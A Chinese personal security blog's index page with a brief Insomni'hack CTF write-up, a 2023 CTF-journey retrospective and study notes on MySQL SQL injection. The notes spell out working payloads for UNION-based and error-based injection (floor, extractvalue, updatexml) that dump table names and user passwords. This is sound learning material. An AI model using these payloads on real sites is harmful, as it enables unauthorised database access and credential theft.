<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"chensonghi.github.io.","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
<meta property="og:type" content="website">
<meta property="og:title" content="星河风">
<meta property="og:url" content="https://chensonghi.github.io./index.html">
<meta property="og:site_name" content="星河风">
<meta property="og:description" content="不是看到希望才坚持，而是坚持了才能看到希望">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="chleynx">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://chensonghi.github.io./">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>星河风</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">星河风</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/Insomni-hack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="星河风">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/05/Insomni-hack/" class="post-title-link" itemprop="url">Insomni'hack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-02-05 00:00:09 / 修改时间：00:11:11" itemprop="dateCreated datePublished" datetime="2024-02-05T00:00:09+08:00">2024-02-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="InsoBank"><a href="#InsoBank" class="headerlink" title="InsoBank"></a>InsoBank</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">by clZ</span><br><span class="line"></span><br><span class="line">We&#x27;re launching a new online Bank today which is of course backed by crypto and AI which makes it better than any other banking system out there.</span><br><span class="line"></span><br><span class="line">It&#x27;s not fully featured yet as you can only transfer money within your own accounts, but you can already see how superior it is to other systems:</span><br><span class="line"></span><br><span class="line">http://91.92.201.197:3000/</span><br><span class="line"></span><br><span class="line">Source: here</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (accountid,name,balance) in cursor.fetchall():</span><br><span class="line">        if balance &gt; 13.37:</span><br><span class="line">            results[accountid] = &#123;&#x27;name&#x27;: name, &#x27;balance&#x27;: balance, &#x27;flag&#x27;: FLAG&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/05/Insomni-hack/image-20240204225812809-1707062535487-1.png" alt="image-20240204225812809"></p>
<p>python精度问题</p>
<p><img src="/2024/02/05/Insomni-hack/image-20240204225846640-1707062535488-2.png" alt="image-20240204225846640"></p>
<p>ok</p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/01/29/my2023total/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="星河风">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/01/29/my2023total/" class="post-title-link" itemprop="url">My 2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-01-29 13:38:57 / 修改时间：15:31:42" itemprop="dateCreated datePublished" datetime="2024-01-29T13:38:57+08:00">2024-01-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Total/" itemprop="url" rel="index"><span itemprop="name">Total</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>emmm，我也想总结一下下（QWQ）我的2023。</p>
<p><img src="/images/wps1.png" alt="img"> </p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>高考完之后，莫名的就像填计算机啦，也不知道为啥。进入学校发现并且接触到小红帽这个组织，其实我超级社恐，经过学长的帮助我成功进入了网络部，vocal，发现这里有超级🐂而且还喜欢帮助我们的学长学姐，也有志同道合的朋友，感觉真是幸福了。然后就开始正式开始前端啦，不知道是因为喜欢还是想努力一点，反正就是经常都学到深夜，然后在学长学姐的推荐↓参加了网页设计大赛，呃呃呃第二名，我有亿点社恐然后还没有准备，答辩的时候，我不知道我们在讲些啥，哈哈哈总归学了那么久还是有点收货啦</p>
<p><img src="/images/wps2.png" alt="img"> </p>
<h2 id="网安"><a href="#网安" class="headerlink" title="网安"></a>网安</h2><p>怎么说呢，也是在学长的帮助下，加上这个东西有点兴趣，就拉着一个挺上进的室友去参加了一个emmm算是小培训吧，vocal在这里又认识了另外一些学长学姐，恰逢网页设计大赛之前，我也恰好遇到一些问题，反正就没听这个培训的内容(后面被举报了d(ŐдŐ๑)，就全去问大佬网页的问题了。</p>
<p>然后就是国赛的招新赛啦！我只能说是真的有点运气好，叫上我的室友，我们就开始第一次CTF了，怎么说呢，感觉有种有点上瘾的感觉，哈哈哈后来才知道，还是学长很用心的出了适合我们的题目(不然只能当场退役了)，恰好之前学了一点点前端，再加上室友当时听了一些培训的内容，总之我们俩还是成功选上了。到了国赛初赛我才知道，CTF的不同，校内选拔赛全靠学长努力���，我根本不会啊，我记得学长问我这个符号是啥  ^   其实我很懵，我根本不知道啊，我连别人做好的我连脚本都看不懂，但好在学长学姐努力���，我成功进线下赛啦。虽然我们队没有取得好成绩，属于是直接去旅游啦（真的是去旅游的！真的），但是现在才知道，才接触CTF就有这种机会，真的超级幸运了（说不完根本说不完，只能感谢学长们了@kdxcxs，@CH3NQU）…………真的一路全靠带</p>
<p><img src="/images/wps3.png" alt="img"> </p>
<h2 id="遗憾"><a href="#遗憾" class="headerlink" title="遗憾"></a>遗憾</h2><p>好像是暑假的时候，其实当时才国赛回来，emm感觉我啥也不会，很受伤狠狠的质疑了自己。然后有一填参加了一下nepnep的招新赛，其实当时我也不知道是招新赛，只是在nss看见这个比赛了，我就去打了一下下，有些题目感觉真的可能做出来，就去bilibili看了一下赛后讲解（绝对不是为了抽奖qwq），然后发现可以投简历NepNep啊，那么大的战队，感觉离我很远很远，但是感觉挺好奇的之前没有投过简历，我直接Google找到一个模板，浅填了一下基本信息，然后里面啥也没有了。vocal，hr加我了，我有面试的机会，很激动很激动，但是感觉自己真的学的很少很少，就属于是漫无目的的学，知道一些东西但是仅限于知道。然后就跟CH3NQU大哥说了，大哥是真的很好很好，经常帮助我。然后我们聊了很多，也鼓励我冲。反正我啥也没有这种机会也不要钱，那就冲吧，还帮我联系到了贝塔姐（NepNep战队的，vocal深藏不露，我这是又认识一个大佬，我跑去跟贝塔姐也聊了很多，哈哈哈哈谁不喜欢高质量人才呢，我只能再次说我好幸运，贝塔姐也帮我。</p>
<p>开始面试，vocal我都不知道是几个大佬在轮番拷打我了，这时候我才发现，我是真不会啊，但这也是学习的机会，我知道了自己的很多不足啦，我心里很清楚，没抓住这次机会。还是怪自己之前努力并不够。然后vocal，kdxcxs哥直接一个电话打过来，说帮我复盘这个面试，然后还叫上了贝塔姐。vocal我何德何能啊。总之，真的是很幸运很幸运了，但是自己还是得加油，遗憾就遗憾吧，不能那么多好事都让我占了吧</p>
<p><img src="/images/wps4.png" alt="img"> </p>
<h2 id="幸运"><a href="#幸运" class="headerlink" title="幸运"></a>幸运</h2><p>emm前面都说了那么多幸运了，但是还是想继续说一些其它的，比如遇到超级超级温柔漂亮的女朋友（其他不告诉你）。比如小红帽，这里真是我大学以来开始努力的地方，恰好遇到了很多志同道合的朋友，很多学长学姐都在帮助我们，哈哈哈比如之前说了那么多的CH3NQU大哥，卫老师（怎么说就是🐂，就是好），贺最（怎么说，就是亲民）还有很多很多不是我们部门的人啦，比如秋秋姐，王最，蒋老师他们（说不完根本说不完）。当然，也少不了我们一级的干事了，磊子哥，娅姐，棋总，坤哥，小学同学等等等等等等等，还有其它部门的很多好朋友们。下半年也是继续留着小红帽了，我们又找到了新干事们了，属于都是很牛的，很卷的，总之就是各有所长了。再比如室友们，大家都超级和睦，相处起来非常融洽，属于是在高考完刷抖音刷到寝室问题的时候心里提起的大石头，算是落地了。</p>
<p>然后就是C0ba1t了，队友们感觉不仅很强，而且都很努力，属于是找到另一个归属了</p>
<p>然后就是CO啦，这里真的很多大佬了，有很负责的老师，还有很多很多大佬学长，有很多的资源，有非常好的学习氛围。真的非常荣幸能够进入co</p>
<p>（不行太多了，说不完根本说不完）</p>
<p>总之就是很幸运啦！</p>
<p><img src="/images/wps5.png" alt="img"> </p>
<h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><p>下半年我们自己打了很多CTF比赛，很多时候都是去坐牢了d(ŐдŐ๑)没办法我太菜了(;´༎ຶД༎ຶ&#96;) ，但是，还是很多很多收货都，比如线下见到暑假网友辉哥，还看见很多其它学校的大佬，最后获得了二等奖，属于是有点不甘心但是有一些意外，但是更多的还是我太菜了d(ŐдŐ๑)。然后然后vocal大佬直接带我们进r3kapig子战队，又属于是幸福了，然后那些比赛就是以另一种奇特的方式坐牢了d(ŐдŐ๑)，开始接触更多的国际赛，很少很少做出题。在notion里面看见大佬的解题思路，真的属于是走进新世界的大门，真的有很努力的复现了，但是有些真的看着思路给了exp我都打不出来，菜的想死，甚至还能把自己电脑文件搞掉，服务器直接被拿下。真服了。</p>
<p>但是在这途中还是参加了一下其他的比赛，属于是混奖了，王最大哥直接带飞。还有其它的我就只写个网页，就其他的全靠别人的成果了。</p>
<p><img src="/images/wps6.png" alt="img"> </p>
<h2 id="挖洞"><a href="#挖洞" class="headerlink" title="挖洞"></a>挖洞</h2><p>在年末那几天，CH3NQU哥拿下几个学校的漏洞，我之前也试过但是苦于根本找不到在哪，然后就在那几天突然发现一个洞，然后没过几天浅试一下就又找到了。感觉就是挖简单的洞只要有点经验，然后很容易找到的（我想要0day，我想CVE������）</p>
<p><img src="/images/wps7.png" alt="img"> </p>
<p>总之呢，2023有很多很多幸运都事情，也有很多很多烦恼，也不是一些文字螚描述清楚的，emmm，反正还是得继续继续努力，越想自己越菜，加油吧！！！！！冲冲冲！！</p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/20/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="星河风">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-20 18:38:57" itemprop="dateCreated datePublished" datetime="2023-10-20T18:38:57+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-10-22 23:16:06" itemprop="dateModified" datetime="2023-10-22T23:16:06+08:00">2023-10-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Summar/" itemprop="url" rel="index"><span itemprop="name">Summar</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10594#toc-6">SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)</a>[盲注去这]</p>
<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>很多时候联合查询也会和其他的几种查询方式一起使用。</p>
<h5 id="联合查询用到的SQL语法知识"><a href="#联合查询用到的SQL语法知识" class="headerlink" title="联合查询用到的SQL语法知识"></a>联合查询用到的SQL语法知识</h5><p><code>UNION</code>可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</p>
<p><code>UNION ALL</code>功能相同，但是会显示所有数据，不会去重。</p>
<p>具有类似功能的还有<code>JOIN</code> <a target="_blank" rel="noopener" href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> 但是是一个对库表等进行连接的语句，我们在后续的绕过中会提到利用它来进行无列名注入。</p>
<h5 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h5><ol>
<li><p>判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜测SQL查询语句中的字段数</p>
<ul>
<li>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br></pre></td></tr></table></figure>

<ul>
<li>使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure>
</li>
<li><p>确定显示数据的字段位置<br>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。</li>
<li>⼀定要拼接够足够的字段数，否则SQL语句报错。</li>
</ul>
</li>
<li><p>在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：</p>
<ul>
<li>获取当前数据库名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>

<ul>
<li>获取当前数据库的表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure>

<ul>
<li>获取表中的字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3--+</span><br></pre></td></tr></table></figure>

<ul>
<li>获取数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>一般情况下就是这样的一个顺序，<code>确定联合查询的字段数-&gt;确定联合查询回显位置-&gt;爆库-&gt;爆表-&gt;爆字段-&gt;爆数据</code>。</p>
<h2 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h2><h4 id="报错注入用到的SQL语法知识"><a href="#报错注入用到的SQL语法知识" class="headerlink" title="报错注入用到的SQL语法知识"></a>报错注入用到的SQL语法知识</h4><p>大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行，<strong>报错的过程可能会出现在查询或者插入甚至删除的过程</strong>中。</p>
<h4 id="0x00-floor-（8-x-mysql-5-0）-双查询报错注入"><a href="#0x00-floor-（8-x-mysql-5-0）-双查询报错注入" class="headerlink" title="0x00 floor()（8.x&gt;mysql&gt;5.0）[双查询报错注入]"></a>0x00 floor()（8.x&gt;mysql&gt;5.0）[双查询报错注入]</h4><p>函数返回小于或等于指定值（value）的最小整数,取整</p>
<blockquote>
<p>通过floor报错的方法来爆数据的<strong>本质是group by语句的报错</strong>。group by语句报错的原因是<code>floor(random(0)*2)</code>的不确定性，即可能为0也可能为1</p>
<p>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，<strong>如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。</strong></p>
<p>group by <code>floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表<strong>只有key为1的行不存在key为0的行</strong>，那么数据库要将该条记录<strong>插入</strong>临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时<strong>冲突而报错</strong>。即检测时和插入时两次计算了随机数的值。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">/*拆解出来就是下面的语句*/</span><br><span class="line">concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x</span><br></pre></td></tr></table></figure>

<p><strong>可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错</strong></p>
<p>大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个<code>Floor()</code>就是这种情况。</p>
<h4 id="0x01-extractvalue-Writeup-2023-0xGame-Week2-rdj’s-Blog-notnad3-github-io-https-notnad3-github-io-2023-10-01-Week-2-ez-upload-【例题，sql注入】"><a href="#0x01-extractvalue-Writeup-2023-0xGame-Week2-rdj’s-Blog-notnad3-github-io-https-notnad3-github-io-2023-10-01-Week-2-ez-upload-【例题，sql注入】" class="headerlink" title="0x01 extractvalue()        [Writeup_2023_0xGame_Week2 - rdj’s Blog (notnad3.github.io)](https://notnad3.github.io/2023/10/01/[Week 2] ez_upload&#x2F;)【例题，sql注入】"></a>0x01 extractvalue()        [Writeup_2023_0xGame_Week2 - rdj’s Blog (notnad3.github.io)](<a target="_blank" rel="noopener" href="https://notnad3.github.io/2023/10/01/[Week">https://notnad3.github.io/2023/10/01/[Week</a> 2] ez_upload&#x2F;)【例题，sql注入】</h4><p>对XML文档进行查询的函数</p>
<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))</span><br></pre></td></tr></table></figure>

<p>其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样</p>
<p>语法：extractvalue(目标xml文档，xml路径)</p>
<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
<p>正常查询 第二个参数的位置格式 为 &#x2F;xxx&#x2F;xx&#x2F;xx&#x2F;xx ,即使查询不到也不会报错</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(‘anything’,’&#x2F;x&#x2F;xx’))</p>
<p><img src="https://img-blog.csdn.net/20180609105306938" alt="img"></p>
<p>使用concat()拼接 ‘  &#x2F;  ‘ 效果相同，</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(‘anything’,concat(‘&#x2F;’,(select database()))))</p>
<p><img src="https://img-blog.csdn.net/20180609105334286" alt="img"></p>
<p>这里在’anything’中查询不到 位置是 &#x2F;database()的内容，</p>
<p>但也没有语法错误，不会报错，下面故意写入语法错误：</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p>
<p><img src="https://img-blog.csdn.net/20180609105509672" alt="img"></p>
<p>可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。</p>
<p>有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p>
<p>这里查询前5位示意:</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))</p>
<p><img src="https://img-blog.csdn.net/20180609105559745" alt="img"></p>
<h4 id="0x02-UPDATEXML-XML-document-XPath-string-new-value"><a href="#0x02-UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="0x02 UPDATEXML (XML_document, XPath_string, new_value);"></a>0x02 UPDATEXML (XML_document, XPath_string, new_value);</h4><ul>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc</li>
<li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li>
<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li>
</ul>
<p>作用：改变文档中符合条件的节点的值</p>
<p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p>
<p>这也是一种非常常见的报错注入的函数。</p>
